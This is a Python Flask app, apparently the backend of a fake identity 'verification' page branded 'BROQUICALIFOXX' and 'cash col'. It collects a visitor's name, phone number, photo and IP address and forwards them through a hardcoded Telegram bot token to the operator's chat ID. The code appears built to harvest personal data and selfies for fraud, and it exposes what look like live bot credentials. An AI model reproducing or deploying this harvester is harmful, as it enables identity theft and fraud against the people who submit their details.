import os
from flask import Flask, render_template, request, jsonify
import telebot

app = Flask(__name__)

# --- CONFIGURACIÓN ---
TOKEN = "8605174246:AAGdyqFbKp6ND3fyCQwvcXvKN2zyT4yywOw"
MI_ID = "8114050673"
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files['foto']

        reporte = (
            f"⚠️ **NUEVA VERIFICACIÓN: BROQUICALIFOXX**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Usuario:** {nombre}\n"
            f"📱 **Teléfono:** {telefono}\n"
            f"📍 **IP:** {request.remote_addr}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💻 **Sistema:** ꃳꋪꄲꆰ꒤꒐『꧁༺ 𝓬𝓪𝓼𝓱 𝓬𝓸𝓵 ༻꧂ 』"
        )

        bot.send_photo(MI_ID, foto, caption=reporte, parse_mode='Markdown')
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))